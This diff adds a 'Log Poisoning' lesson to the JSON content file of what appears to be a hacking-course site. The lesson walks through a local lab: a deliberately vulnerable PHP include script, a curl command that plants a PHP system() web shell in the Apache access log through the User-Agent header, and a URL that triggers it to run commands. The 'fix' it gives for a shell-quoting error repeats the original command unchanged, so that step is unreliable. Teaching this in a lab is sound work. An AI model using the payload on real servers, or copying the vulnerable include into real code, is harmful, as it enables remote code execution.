@@ -2317,5 +2317,234 @@
         ]
       }
     ]
+  },
+  {
+    "id": 8,
+    "slug": "log-poisoning",
+    "title": "Log Poisoning",
+    "category": "notes",
+    "blocksFile": "./blocks/log-poisoning.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "prerequisites": [
+      {
+        "title": "Basic LFI",
+        "slug": "lfi"
+      }
+    ],
+    "blocks": [
+      {
+        "id": "download-lfi-lab",
+        "type": "download",
+        "title": "LFI Practice Lab",
+        "text": "Download the vulnerable PHP lab and payload collection.",
+        "fileName": "lfi-input-lab.zip",
+        "url": "/downloads/lfi-input-lab.zip",
+        "size": "4kb"
+      },
+      {
+        "type": "section_heading",
+        "id": "log-poisoning-intro",
+        "text": "What is Log Poisoning?"
+      },
+      {
+        "type": "order_block",
+        "id": "log-poisoning-definition",
+        "text": "Log Poisoning is a technique where an attacker injects malicious PHP code into a server log file and then uses a Local File Inclusion (LFI) vulnerability to include that log file, causing the injected code to execute."
+      },
+      {
+        "type": "order_block",
+        "id": "log-poisoning-concept",
+        "text": "This works because PHP parses any file included via <highlight>include()</highlight> or <highlight>require()</highlight> as PHP source code, regardless of its file extension."
+      },
+      {
+        "type": "section_heading",
+        "id": "lab-setup",
+        "text": "Lab Setup"
+      },
+      {
+        "type": "code_block",
+        "id": "vulnerable-code",
+        "language": "php",
+        "code": "<?php\nif(isset($_GET['file'])) {\n    $file = $_GET['file'];\n    include($file);\n}\n?>"
+      },
+      {
+        "type": "section_heading",
+        "id": "environment-setup",
+        "text": "Environment Setup"
+      },
+      {
+        "type": "code_block",
+        "id": "start-apache",
+        "language": "bash",
+        "code": "sudo systemctl start apache2"
+      },
+      {
+        "type": "code_block",
+        "id": "verify-webroot",
+        "language": "bash",
+        "code": "cd /var/www/html\nls"
+      },
+      {
+        "type": "section_heading",
+        "id": "step-1-verify-lfi",
+        "text": "Step 1 - Verify LFI"
+      },
+      {
+        "type": "code_block",
+        "id": "read-passwd",
+        "language": "bash",
+        "code": "http://127.0.0.1/lfi-input-lab/secret-script.php?file=/etc/passwd"
+      },
+      {
+        "type": "section_heading",
+        "id": "step-2-read-log",
+        "text": "Step 2 - Attempt to Read Access Log"
+      },
+      {
+        "type": "code_block",
+        "id": "read-access-log",
+        "language": "bash",
+        "code": "curl \"http://127.0.0.1/lfi-input-lab/secret-script.php?file=/var/log/apache2/access.log\""
+      },
+      {
+        "type": "section_heading",
+        "id": "error-1-permission-denied",
+        "text": "Error 1 - Permission Denied"
+      },
+      {
+        "type": "output_block",
+        "id": "permission-error-output",
+        "language": "bash",
+        "code": "Warning: include(/var/log/apache2/access.log): Failed to open stream: Permission denied"
+      },
+      {
+        "type": "order_block",
+        "id": "permission-analysis",
+        "text": "Even though access.log had read permissions, the directory <highlight>/var/log/apache2</highlight> did not allow traversal by the web server user."
+      },
+      {
+        "type": "code_block",
+        "id": "check-permissions",
+        "language": "bash",
+        "code": "ls -ld /var/log/apache2"
+      },
+      {
+        "type": "order_block",
+        "id": "permission-fix",
+        "text": "The directory had restricted execute permissions. To allow traversal for lab purposes:"
+      },
+      {
+        "type": "code_block",
+        "id": "fix-permissions",
+        "language": "bash",
+        "code": "sudo chmod 755 /var/log/apache2\nsudo systemctl restart apache2"
+      },
+      {
+        "type": "section_heading",
+        "id": "step-3-inject-payload",
+        "text": "Step 3 - Inject PHP Payload into Log"
+      },
+      {
+        "type": "code_block",
+        "id": "inject-user-agent",
+        "language": "bash",
+        "code": "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://127.0.0.1/"
+      },
+      {
+        "type": "section_heading",
+        "id": "error-2-shell-expansion",
+        "text": "Error 2 - Shell Interpreting Payload"
+      },
+      {
+        "type": "output_block",
+        "id": "shell-error-output",
+        "language": "bash",
+        "code": "zsh: bad math expression: operand expected at 'cmd'"
+      },
+      {
+        "type": "order_block",
+        "id": "shell-error-explanation",
+        "text": "The shell attempted to interpret <highlight>$_GET</highlight> as a variable before sending the request."
+      },
+      {
+        "type": "order_block",
+        "id": "shell-fix",
+        "text": "Fix by using single quotes to prevent variable expansion:"
+      },
+      {
+        "type": "code_block",
+        "id": "shell-fix-command",
+        "language": "bash",
+        "code": "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://127.0.0.1/"
+      },
+      {
+        "type": "section_heading",
+        "id": "step-4-trigger-rce",
+        "text": "Step 4 - Trigger Code Execution"
+      },
+      {
+        "type": "code_block",
+        "id": "trigger-rce",
+        "language": "bash",
+        "code": "http://127.0.0.1/lfi-input-lab/secret-script.php?file=/var/log/apache2/access.log&cmd=whoami"
+      },
+      {
+        "type": "output_block",
+        "id": "rce-output",
+        "language": "bash",
+        "code": "www-data"
+      },
+      {
+        "type": "section_heading",
+        "id": "multi-execution",
+        "text": "Multiple Payload Execution"
+      },
+      {
+        "type": "order_block",
+        "id": "multi-execution-explanation",
+        "text": "If the payload appears multiple times inside the log file, it executes multiple times because PHP parses the entire file and runs every <?php ?> block it encounters."
+      },
+      {
+        "type": "section_heading",
+        "id": "why-it-works",
+        "text": "Why This Works"
+      },
+      {
+        "type": "explanation",
+        "id": "mechanism-breakdown",
+        "title": "Execution Mechanism",
+        "items": [
+          "include() reads the entire file, not line by line.",
+          "PHP parses the file regardless of its extension.",
+          "Text outside PHP tags is printed.",
+          "Code inside <?php ?> is executed.",
+          "Repeated payloads result in repeated execution."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "final-conclusion",
+        "text": "Conclusion"
+      },
+      {
+        "type": "order_block",
+        "id": "log-poisoning-summary",
+        "text": "Log Poisoning transforms an LFI vulnerability into Remote Code Execution by injecting PHP into writable logs and forcing the application to include them. The attack succeeds because the application blindly includes attacker-controlled content without validation."
+      }
+    ]
+  },
+  {
+    "id": 8,
+    "slug": "session-poisoning",
+    "title": "Session Poisoning - We will cover this when we start web attacks.",
+    "category": "notes",
+    "blocksFile": "./blocks/session-poisoning.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "prerequisites": [
+      {
+        "title": "Basic LFI",
+        "slug": "lfi"
+      }
+    ]
   }
 ]
